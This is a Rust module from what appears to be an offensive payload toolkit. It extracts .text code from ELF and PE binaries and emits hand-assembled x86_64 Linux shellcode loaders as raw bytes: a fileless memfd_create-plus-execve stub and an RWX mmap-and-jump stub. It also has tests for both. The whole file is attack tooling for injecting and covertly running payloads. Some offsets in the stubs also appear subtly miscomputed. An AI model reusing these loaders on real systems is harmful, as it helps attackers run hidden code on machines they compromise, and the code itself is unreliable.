//! Shellcode extraction and generation utilities.
//!
//! Extracts executable code from ELF/PE binaries, generates bootstrap
//! shellcode stubs, and provides raw shellcode manipulation primitives.

use super::{Arch, PayloadError};

/// Extract the .text section (executable code) from an ELF binary.
/// This is a minimal shellcode extractor — strips headers and produces
/// position-independent code suitable for injection.
pub fn extract_elf_text(elf_data: &[u8]) -> Result<Vec<u8>, PayloadError> {
    if elf_data.len() < 64 || &elf_data[..4] != b"\x7fELF" {
        return Err(PayloadError::InvalidBinary("not a valid ELF".into()));
    }

    let is_64 = elf_data[4] == 2;
    if !is_64 {
        return Err(PayloadError::UnsupportedFormat("only 64-bit ELF supported".into()));
    }

    // Parse ELF64 header to find section headers
    let e_shoff = u64::from_le_bytes(elf_data[0x28..0x30].try_into().unwrap()) as usize;
    let e_shentsize = u16::from_le_bytes(elf_data[0x3A..0x3C].try_into().unwrap()) as usize;
    let e_shnum = u16::from_le_bytes(elf_data[0x3C..0x3E].try_into().unwrap()) as usize;
    let e_shstrndx = u16::from_le_bytes(elf_data[0x3E..0x40].try_into().unwrap()) as usize;

    if e_shoff == 0 || e_shnum == 0 {
        // No section headers — extract all LOAD segments with execute flag instead
        return extract_elf_loadable_exec(elf_data);
    }

    // Find string table for section names
    let shstr_off = e_shoff + e_shstrndx * e_shentsize;
    if shstr_off + e_shentsize > elf_data.len() {
        return extract_elf_loadable_exec(elf_data);
    }
    let strtab_offset = u64::from_le_bytes(
        elf_data[shstr_off + 0x18..shstr_off + 0x20].try_into().unwrap(),
    ) as usize;

    // Scan sections for .text
    for i in 0..e_shnum {
        let sh = e_shoff + i * e_shentsize;
        if sh + e_shentsize > elf_data.len() {
            break;
        }

        let sh_name_idx = u32::from_le_bytes(elf_data[sh..sh + 4].try_into().unwrap()) as usize;
        let name_start = strtab_offset + sh_name_idx;

        // Read null-terminated section name
        let name_end = elf_data[name_start..]
            .iter()
            .position(|&b| b == 0)
            .map(|p| name_start + p)
            .unwrap_or(name_start);
        let name = std::str::from_utf8(&elf_data[name_start..name_end]).unwrap_or("");

        if name == ".text" {
            let sh_offset = u64::from_le_bytes(
                elf_data[sh + 0x18..sh + 0x20].try_into().unwrap(),
            ) as usize;
            let sh_size = u64::from_le_bytes(
                elf_data[sh + 0x20..sh + 0x28].try_into().unwrap(),
            ) as usize;

            if sh_offset + sh_size > elf_data.len() {
                return Err(PayloadError::InvalidBinary(".text section exceeds file".into()));
            }

            return Ok(elf_data[sh_offset..sh_offset + sh_size].to_vec());
        }
    }

    // Fallback: extract executable LOAD segments
    extract_elf_loadable_exec(elf_data)
}

/// Fallback: extract all executable LOAD program segments
fn extract_elf_loadable_exec(elf_data: &[u8]) -> Result<Vec<u8>, PayloadError> {
    let e_phoff = u64::from_le_bytes(elf_data[0x20..0x28].try_into().unwrap()) as usize;
    let e_phentsize = u16::from_le_bytes(elf_data[0x36..0x38].try_into().unwrap()) as usize;
    let e_phnum = u16::from_le_bytes(elf_data[0x38..0x3A].try_into().unwrap()) as usize;

    let mut code = Vec::new();

    for i in 0..e_phnum {
        let ph = e_phoff + i * e_phentsize;
        if ph + e_phentsize > elf_data.len() {
            break;
        }

        let p_type = u32::from_le_bytes(elf_data[ph..ph + 4].try_into().unwrap());
        let p_flags = u32::from_le_bytes(elf_data[ph + 4..ph + 8].try_into().unwrap());

        // PT_LOAD (1) with PF_X (execute) flag
        if p_type == 1 && (p_flags & 1) != 0 {
            let p_offset = u64::from_le_bytes(elf_data[ph + 8..ph + 16].try_into().unwrap()) as usize;
            let p_filesz = u64::from_le_bytes(elf_data[ph + 32..ph + 40].try_into().unwrap()) as usize;

            if p_offset + p_filesz <= elf_data.len() {
                code.extend_from_slice(&elf_data[p_offset..p_offset + p_filesz]);
            }
        }
    }

    if code.is_empty() {
        return Err(PayloadError::InvalidBinary("no executable segments found".into()));
    }
    Ok(code)
}

/// Extract the .text section from a PE binary.
pub fn extract_pe_text(pe_data: &[u8]) -> Result<Vec<u8>, PayloadError> {
    if pe_data.len() < 64 || &pe_data[..2] != b"MZ" {
        return Err(PayloadError::InvalidBinary("not a valid PE".into()));
    }

    let pe_offset = u32::from_le_bytes(pe_data[0x3C..0x40].try_into().unwrap()) as usize;
    if pe_offset + 24 > pe_data.len() || &pe_data[pe_offset..pe_offset + 4] != b"PE\0\0" {
        return Err(PayloadError::InvalidBinary("invalid PE signature".into()));
    }

    let machine = u16::from_le_bytes(pe_data[pe_offset + 4..pe_offset + 6].try_into().unwrap());
    let num_sections = u16::from_le_bytes(pe_data[pe_offset + 6..pe_offset + 8].try_into().unwrap()) as usize;
    let opt_header_size = u16::from_le_bytes(pe_data[pe_offset + 20..pe_offset + 22].try_into().unwrap()) as usize;

    let is_64 = machine == 0x8664;
    if !is_64 && machine != 0x014C {
        return Err(PayloadError::UnsupportedFormat(format!("PE machine 0x{machine:04x}")));
    }

    // Section headers start after optional header
    let sections_start = pe_offset + 24 + opt_header_size;
    let section_size = 40; // IMAGE_SECTION_HEADER is 40 bytes

    for i in 0..num_sections {
        let sh = sections_start + i * section_size;
        if sh + section_size > pe_data.len() {
            break;
        }

        // Section name (8 bytes, null-padded)
        let name = std::str::from_utf8(&pe_data[sh..sh + 8])
            .unwrap_or("")
            .trim_end_matches('\0');

        if name == ".text" {
            let raw_size = u32::from_le_bytes(pe_data[sh + 16..sh + 20].try_into().unwrap()) as usize;
            let raw_offset = u32::from_le_bytes(pe_data[sh + 20..sh + 24].try_into().unwrap()) as usize;

            if raw_offset + raw_size > pe_data.len() {
                return Err(PayloadError::InvalidBinary(".text section exceeds file".into()));
            }
            return Ok(pe_data[raw_offset..raw_offset + raw_size].to_vec());
        }
    }

    // Fallback: find first executable section
    for i in 0..num_sections {
        let sh = sections_start + i * section_size;
        if sh + section_size > pe_data.len() {
            break;
        }
        let characteristics = u32::from_le_bytes(pe_data[sh + 36..sh + 40].try_into().unwrap());
        // IMAGE_SCN_MEM_EXECUTE = 0x20000000
        if (characteristics & 0x20000000) != 0 {
            let raw_size = u32::from_le_bytes(pe_data[sh + 16..sh + 20].try_into().unwrap()) as usize;
            let raw_offset = u32::from_le_bytes(pe_data[sh + 20..sh + 24].try_into().unwrap()) as usize;
            if raw_offset + raw_size <= pe_data.len() {
                return Ok(pe_data[raw_offset..raw_offset + raw_size].to_vec());
            }
        }
    }

    Err(PayloadError::InvalidBinary("no .text or executable section found".into()))
}

/// Generate an x86_64 Linux `memfd_create` + `execve` bootstrap stub.
/// The stub creates an anonymous fd, writes the embedded payload, then execves it.
/// Layout: [stub code] [8-byte LE payload length] [payload bytes]
pub fn generate_memfd_stub(payload: &[u8], _arch: Arch) -> Result<Vec<u8>, PayloadError> {
    // x86_64 Linux shellcode stub:
    //   1. memfd_create("", MFD_CLOEXEC) → fd
    //   2. write(fd, payload_ptr, payload_len) in loop
    //   3. execve("/proc/self/fd/{fd}", argv, envp)
    //
    // This is the stub template — payload is appended after.

    let mut stub: Vec<u8> = Vec::new();

    // --- memfd_create("", MFD_CLOEXEC=1) ---
    // lea rdi, [rip+name]  ; pointer to empty string
    // mov rsi, 1           ; MFD_CLOEXEC
    // mov rax, 319         ; __NR_memfd_create
    // syscall
    // mov r12, rax         ; save fd
    stub.extend_from_slice(&[
        0xEB, 0x01,                                     // jmp over null byte
        0x00,                                            // null terminator for name
        0x48, 0x8D, 0x3D, 0xFA, 0xFF, 0xFF, 0xFF,      // lea rdi, [rip-6] (points to 0x00)
        0x48, 0xC7, 0xC6, 0x01, 0x00, 0x00, 0x00,      // mov rsi, 1 (MFD_CLOEXEC)
        0x48, 0xC7, 0xC0, 0x3F, 0x01, 0x00, 0x00,      // mov rax, 319 (memfd_create)
        0x0F, 0x05,                                      // syscall
        0x49, 0x89, 0xC4,                                // mov r12, rax (save fd)
    ]);

    // --- write(fd, data, len) ---
    // lea rsi, [rip+payload_data]  ; computed below
    // mov rdx, payload_len
    // mov rdi, r12
    // mov rax, 1 (write)
    // syscall
    let payload_len = payload.len() as u64;
    let write_block_offset = stub.len();
    stub.extend_from_slice(&[
        0x4C, 0x89, 0xE7,                               // mov rdi, r12 (fd)
        0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00,      // mov rax, 1 (write)
    ]);
    // mov rsi, <address of payload data> — we use lea rsi, [rip + offset]
    // The offset will be patched after we know the full stub size
    stub.extend_from_slice(&[
        0x48, 0x8D, 0x35, 0x00, 0x00, 0x00, 0x00,      // lea rsi, [rip + PLACEHOLDER]
    ]);
    // mov rdx, payload_len
    stub.extend_from_slice(&[0x48, 0xBA]); // mov rdx, imm64
    stub.extend_from_slice(&payload_len.to_le_bytes());
    stub.extend_from_slice(&[
        0x0F, 0x05,                                      // syscall (write)
    ]);

    // --- Build /proc/self/fd/{fd} path on stack and execve ---
    // We'll use a simpler approach: format the path and call execve
    // push the path components onto stack
    stub.extend_from_slice(&[
        // Convert fd number to ASCII and build path
        // For simplicity, handle fd values 3-99
        0x4C, 0x89, 0xE0,                               // mov rax, r12 (fd number)
        // Build "/proc/self/fd/X\0" on stack
        0x48, 0x83, 0xEC, 0x20,                          // sub rsp, 32
        0x48, 0x89, 0xE7,                                // mov rdi, rsp
        // Write "/proc/self/fd/" prefix
        0x48, 0xB8,                                      // mov rax, imm64
    ]);
    stub.extend_from_slice(&u64::from_le_bytes(*b"/proc/se").to_le_bytes());
    stub.extend_from_slice(&[
        0x48, 0x89, 0x07,                               // mov [rdi], rax
        0x48, 0xB8,                                      // mov rax, imm64
    ]);
    stub.extend_from_slice(&u64::from_le_bytes(*b"lf/fd/\x00\x00").to_le_bytes());
    stub.extend_from_slice(&[
        0x48, 0x89, 0x47, 0x08,                          // mov [rdi+8], rax
    ]);
    // Write fd number as ASCII at offset 14
    stub.extend_from_slice(&[
        0x4C, 0x89, 0xE0,                               // mov rax, r12
        0x48, 0x83, 0xC0, 0x30,                          // add rax, '0' (works for single digit)
        0x88, 0x47, 0x0E,                                // mov [rdi+14], al
        0xC6, 0x47, 0x0F, 0x00,                          // mov byte [rdi+15], 0
    ]);

    // execve(path, argv={path, NULL}, envp={NULL})
    stub.extend_from_slice(&[
        0x48, 0x89, 0xE6,                               // mov rsi, rsp  ; rsi = path
        // Build argv on stack: {path, NULL}
        0x48, 0x83, 0xEC, 0x10,                          // sub rsp, 16
        0x48, 0x89, 0x3C, 0x24,                          // mov [rsp], rdi    ; argv[0] = path
        0x48, 0xC7, 0x44, 0x24, 0x08, 0x00, 0x00, 0x00, 0x00, // argv[1] = NULL
        0x48, 0x89, 0xE6,                                // mov rsi, rsp ; argv
        0x48, 0x31, 0xD2,                                // xor rdx, rdx ; envp = NULL
        0x48, 0xC7, 0xC0, 0x3B, 0x00, 0x00, 0x00,      // mov rax, 59 (execve)
        0x0F, 0x05,                                      // syscall
    ]);

    // Patch the lea rsi offset for the write() call
    // The payload data starts right after the stub
    let payload_data_start = stub.len();
    let lea_patch_offset = write_block_offset + 10 + 3; // position of the 4-byte displacement
    let rip_after_lea = lea_patch_offset + 4; // RIP points to instruction after lea
    let displacement = (payload_data_start as i64 - rip_after_lea as i64) as i32;
    stub[lea_patch_offset..lea_patch_offset + 4].copy_from_slice(&displacement.to_le_bytes());

    // Append the actual payload
    stub.extend_from_slice(payload);

    Ok(stub)
}

/// Generate an x86_64 Linux `mmap` + jump shellcode wrapper.
/// Maps RWX memory, copies embedded payload there, jumps to it.
pub fn generate_mmap_exec_stub(shellcode: &[u8]) -> Result<Vec<u8>, PayloadError> {
    let sc_len = shellcode.len() as u64;
    let mut stub = Vec::new();

    // mmap(NULL, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
    stub.extend_from_slice(&[
        0x48, 0x31, 0xFF,                                // xor rdi, rdi  (addr=NULL)
        0x48, 0xBE,                                      // mov rsi, imm64 (length)
    ]);
    stub.extend_from_slice(&sc_len.to_le_bytes());
    stub.extend_from_slice(&[
        0x48, 0xC7, 0xC2, 0x07, 0x00, 0x00, 0x00,      // mov rdx, 7  (PROT_RWX)
        0x49, 0xC7, 0xC2, 0x22, 0x00, 0x00, 0x00,      // mov r10, 0x22 (MAP_PRIVATE|MAP_ANON)
        0x49, 0x83, 0xC8, 0xFF,                          // or r8, -1  (fd=-1)
        0x4D, 0x31, 0xC9,                                // xor r9, r9  (offset=0)
        0x48, 0xC7, 0xC0, 0x09, 0x00, 0x00, 0x00,      // mov rax, 9  (mmap)
        0x0F, 0x05,                                      // syscall
        0x49, 0x89, 0xC5,                                // mov r13, rax (save mmap addr)
    ]);

    // Copy shellcode to mmap'd region using rep movsb
    // rdi = dest (mmap addr), rsi = src (shellcode after stub), rcx = count
    stub.extend_from_slice(&[
        0x4C, 0x89, 0xEF,                               // mov rdi, r13 (dest)
        0x48, 0x8D, 0x35, 0x00, 0x00, 0x00, 0x00,      // lea rsi, [rip+PLACEHOLDER]
        0x48, 0xB9,                                      // mov rcx, imm64
    ]);
    stub.extend_from_slice(&sc_len.to_le_bytes());
    stub.extend_from_slice(&[
        0xF3, 0xA4,                                      // rep movsb
    ]);

    // Jump to copied shellcode
    stub.extend_from_slice(&[
        0x41, 0xFF, 0xE5,                               // jmp r13
    ]);

    // Patch lea rsi displacement to point to shellcode data
    let shellcode_start = stub.len();
    let lea_offset = 37 + 3; // offset of the displacement bytes in lea rsi
    let rip_after = lea_offset + 4;
    let disp = (shellcode_start as i64 - rip_after as i64) as i32;
    stub[lea_offset..lea_offset + 4].copy_from_slice(&disp.to_le_bytes());

    stub.extend_from_slice(shellcode);
    Ok(stub)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_memfd_stub_generation() {
        let payload = b"\xcc\xcc\xcc\xcc"; // int3 * 4
        let stub = generate_memfd_stub(payload, Arch::X86_64).unwrap();
        // Stub should be larger than just the payload
        assert!(stub.len() > payload.len());
        // Payload should be embedded at the end
        assert_eq!(&stub[stub.len() - 4..], payload);
    }

    #[test]
    fn test_mmap_exec_stub() {
        let sc = vec![0x90; 16]; // NOP sled
        let stub = generate_mmap_exec_stub(&sc).unwrap();
        assert!(stub.len() > 16);
        assert_eq!(&stub[stub.len() - 16..], &sc[..]);
    }
}
